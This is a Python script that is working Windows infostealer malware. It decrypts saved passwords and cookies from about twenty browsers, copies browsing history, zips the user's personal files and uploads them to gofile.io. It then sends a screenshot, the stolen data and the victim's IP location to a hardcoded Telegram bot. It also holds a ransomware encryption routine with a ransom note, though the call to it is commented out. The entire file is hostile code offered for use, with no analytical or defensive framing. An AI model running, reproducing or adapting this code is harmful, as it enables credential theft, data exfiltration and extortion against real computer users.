token_tele = '7397339049:AAFJ-ugweCKbKlpR3B3WOKdP0eVuP4nfWYE'
import os, sys, requests, mss, fnmatch, shutil, json, base64, sqlite3, win32crypt, subprocess
from datetime import datetime, timedelta
from Cryptodome.Cipher import AES
from cryptography.fernet import Fernet
path_data = rf"C:\Users\Public\{os.environ['USERNAME']}"
if not os.path.exists(path_data):
    os.makedirs(path_data)
cookie_dir = os.path.join(path_data, 'Cookie')
if not os.path.exists(cookie_dir):
    os.makedirs(cookie_dir)
password_dir = os.path.join(path_data, 'Password')
if not os.path.exists(password_dir):
    os.makedirs(password_dir)
history_dir = os.path.join(path_data, 'History')
if not os.path.exists(history_dir):
    os.makedirs(history_dir)
datatext_dir = os.path.join(rf"C:\Users\{os.environ['USERNAME']}\AppData\Local\Temp", 'Data')
if not os.path.exists(datatext_dir):
    os.makedirs(datatext_dir)
datatext_extensions = ['*.exe']
def upload_file(path):
    result = subprocess.Popen(f'curl -F "file=@{path}" https://store1.gofile.io/contents/uploadfile', shell=True, stdout=subprocess.PIPE).communicate()[0].decode()
    return json.loads(result)["data"]["downloadPage"]
def generate_random_key():
    keyenc = base64.urlsafe_b64encode(os.urandom(32))
    return keyenc.decode()
keyenc = generate_random_key()
def encrypt_file(file_path, keyenc):
    obf_map = {'A': '汉', 'B': 'ب', 'C': 'คำ', 'D': '日', 'E': '한국', 'F': '你', 'G': 'م', 'H': 'รัก', 'I': '喜', 'J': '사', 'K': '中', 'L': 'ل', 'M': 'เมือง', 'N': '生', 'O': '这', 'P': 'ماذا', 'Q': 'ที่', 'R': '要', 'S': '선', 'T': '能', 'U': 'ج', 'V': 'ไป', 'W': '吗', 'X': 'بار', 'Y': 'ไป', 'Z': '错', 'a': '下', 'b': 'بغض', 'c': 'เ', 'd': '风', 'e': '인', 'f': '火', 'g': 'ح', 'h': 'จ', 'i': '星', 'j': '자', 'k': '村', 'l': 'ز', 'm': 'ปลา', 'n': '花', 'o': '树', 'p': 'طائر', 'q': 'ปลา', 'r': '虫', 's': '고양이', 't': '狗', 'u': 'ا', 'v': 'โค', 'w': '马', 'x': 'غنم', 'y': 'ไก่', 'z': '猪', '0': '零', '1': 'واحد', '2': 'สอง', '3': '三', '4': '四', '5': 'خمسة', '6': 'หก', '7': '七', '8': '八', '9': 'تسعة', '+': '加', '/': '分', '=': '等'}
    fernet = Fernet(keyenc.encode())
    with open(file_path, 'r', encoding='utf-8') as file:
        data = file.read()
    if data.startswith("All your files have been encrypted, contact https://t.me/hiahihn to decrypt them\n"):
        return
    encrypted_data = fernet.encrypt(data.encode())
    encoded_data = base64.b64encode(encrypted_data).decode()
    obfuscated_data = '|'.join(obf_map[char] for char in encoded_data)
    obfhiahihn = "All your files have been encrypted, contact https://t.me/hiahihn to decrypt them\n" + obfuscated_data
    with open(file_path, 'w', encoding='utf-8') as file:
        file.write(obfhiahihn)
def DataText():
    skip_folders = {'AppData', 'Program Files', 'Program Files (x86)', 'Windows', 'System32', 'ProgramData', 'Local Settings', 'Temp', 'Recovery', 'Config.Msi'}
    for root, _, files in os.walk(os.environ['USERPROFILE']):
        if any(folder in root for folder in skip_folders):
            continue
        for file in files:
            if any(fnmatch.fnmatch(file, ext) for ext in datatext_extensions):
                continue
            source_file = os.path.join(root, file)
            ext = os.path.splitext(file)[1][1:]
            destination_dir = os.path.join(datatext_dir, ext)
            destination_file = os.path.join(destination_dir, file)
            if source_file == destination_file:
                continue
            os.makedirs(destination_dir, exist_ok=True)
            try:
                shutil.copy2(source_file, destination_file)
                #encrypt_file(source_file, keyenc)
            except Exception as e:
                pass
    shutil.make_archive(datatext_dir, 'zip', datatext_dir)
    url_download = upload_file(f'{datatext_dir}.zip')
    try:
        os.remove(f'{datatext_dir}.zip')
        shutil.rmtree(datatext_dir)
    except Exception as e:
        pass
    return url_download
datafile = DataText()
def find_profile(data_path):
    profile=[]    
    profile.append('Default')
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if(text[0] == 'Profile'):
                profile.append(folder)
        return profile
    except:pass
def geoip():
    ip_response = requests.get("https://api.ipify.org/")
    ip = ip_response.text
    location_response = requests.get(f"http://ip-api.com/json/{ip}")
    location_data = location_response.json()
    country = location_data.get("country", "Unknown")
    regionName = location_data.get("regionName", "Unknown")
    city = location_data.get("city", "Unknown")
    timezone = location_data.get("timezone", "Unknown")
    return f"IP: {ip}\nCountry: {country}\nRegion: {regionName}\nCity: {city}\nTimezone: {timezone}\nKey: {keyenc}"
def browser():
    a = [{"name": "Google", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"))},{"name": "CocCoc", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"))},{"name": "Edge", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))},{"name": "Chromium", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"))},{"name": "Amigo", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"))},{"name": "Torch", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"))},{"name": "Kometa", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"))},{"name": "Orbitum", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"))},{"name": "CentBrowser", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"))},{"name": "7Star", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"))},{"name": "Sputnik", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"))},{"name": "Vivaldi", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"))},{"name": "GoogleChromeSxS", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"))},{"name": "EpicPrivacyBrowser", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"))},{"name": "Uran", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"))},{"name": "Yandex", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"))},{"name": "Brave", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))},{"name": "Iridium", "path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"), "profile": find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"))},{"name": "Opera", "path": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"), "profile": find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"))},{"name": "OperaGX", "path": os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"), "profile": find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"))}]
    return a
def getSecretKey(path1):
    try:
        path = os.path.normpath(path1 + "\\Local State")
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        return None
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)
def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decryptPassword(ciphertext, secret_key):
    try:
        if len(ciphertext) < 31:
            return None
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        return None
def start1():
    bc = browser()
    cookie = []
    temp_dir = os.path.join(path_data, 'Temp')
    os.makedirs(temp_dir, exist_ok=True)
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
                        temp_cookie_path = os.path.join(temp_dir, 'Cookie ' + bs['name'] + ' ' + profile)
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), temp_cookie_path)
                        cookie.append({'path': temp_cookie_path, 'pathkey': bs['path'], 'name': bs['name'], 'profile': profile})
                except: pass
        else:
            pass
    return cookie
def start2():
    bc = browser()
    password = []
    temp_dir = os.path.join(path_data, 'Temp')
    os.makedirs(temp_dir, exist_ok=True)
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')):
                        temp_login_path = os.path.join(temp_dir, 'Login ' + bs['name'] + ' ' + profile)
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), temp_login_path)
                        password.append({'path': temp_login_path, 'pathkey': bs['path'], 'name': bs['name'], 'profile': profile})
                except: pass            
        else:
            pass
    return password
def query_history():
    browsers = browser()
    temp_dir = os.path.join(path_data, 'Temp')
    os.makedirs(temp_dir, exist_ok=True)
    for bs in browsers:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    history_file = os.path.join(bs['path'], profile, 'History')
                    if os.path.exists(history_file):
                        temp_db = os.path.join(temp_dir, f"{bs['name']}_{profile}.sqlite")
                        shutil.copyfile(history_file, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT url FROM urls")
                        history_data = cursor.fetchall()
                        with open(os.path.join(history_dir, f"{bs['name']}_{profile}_History.txt"), "w", encoding='utf-8') as f:
                            for entry in history_data:
                                f.write(f"{entry[0]}\n")
                        conn.close()
                        os.remove(temp_db)
                except Exception as e:
                    pass
def extract():
    temp_dir = os.path.join(path_data, 'Temp')
    os.makedirs(temp_dir, exist_ok=True)
    datacookie = start1()
    for row in datacookie:            
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT host_key, name, value, encrypted_value, is_httponly, is_secure, expires_utc FROM cookies'
        cursor.execute(select_statement)
        bc = cursor.fetchall()
        data1 = []
        last_host_key = None
        for user in bc:
            value = decryptPassword(user[3], getSecretKey(row['pathkey']))
            if value is None:
                continue
            httponly = "TRUE" if user[4] == 1 else "FALSE"
            secure = "TRUE" if user[5] == 1 else "FALSE"
            cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"
            if last_host_key is not None and last_host_key != user[0]:
                data1.append("******************************************************************************************************************************************************\n")
            data1.append(cookie)
            last_host_key = user[0]
        with open(os.path.join(path_data, 'Cookie', row['name'] + ' ' + row['profile'] + '.txt'), "w", encoding='utf-8') as f:
            for line in data1:
                f.write(line)
        c.close()
        os.remove(row['path'])
    datapassword = start2()
    for row in datapassword:
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT action_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        data2 = []
        for userdatacombo in login_data:
            if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "" and userdatacombo[0] != "":
                password = decryptPassword(userdatacombo[2], getSecretKey(row['pathkey']))
                data = "**************************************************\nURL: " + userdatacombo[0] + " \nUsername: " + userdatacombo[1] + " \nPassword: " + str(password)
                data2.append(data)
            else:
                pass
        with open(os.path.join(path_data, 'Password', row['name'] + ' ' + row['profile'] + '.txt'), "w", encoding='utf-8') as f:
            for line in data2:
                f.write(line + "\n")
        c.close()
        os.remove(row['path'])
    query_history()
    shutil.rmtree(temp_dir)
extract()
timeVN = (datetime.utcnow() + timedelta(hours=7)).strftime("%H.%M.%S_%d.%m.%Y")
file_path = os.path.join(r"C:\Users\ADMIN\Documents", timeVN)
shutil.make_archive(file_path, 'zip', path_data)
file_path = file_path + ".zip"
with mss.mss() as sct: photo = sct.shot(output=r"C:\Users\ADMIN\Documents\photo.png")
requests.post(f"https://api.telegram.org/bot{token_tele}/sendPhoto",data={'chat_id': '6910865834'},files={'photo': open(r"C:\Users\ADMIN\Documents\photo.png", 'rb')})
requests.post(f"https://api.telegram.org/bot{token_tele}/sendDocument",params={"chat_id": "6910865834", "caption": geoip()},files={"document": (f"{timeVN}.zip", open(file_path, 'rb'))})
requests.post(f"https://api.telegram.org/bot{token_tele}/sendMessage",params={"chat_id": "6910865834", "text": datafile})
os.remove(file_path) if os.path.exists(file_path) else None
os.remove(r"C:\Users\ADMIN\Documents\photo.png") if os.path.exists(r"C:\Users\ADMIN\Documents\photo.png") else None
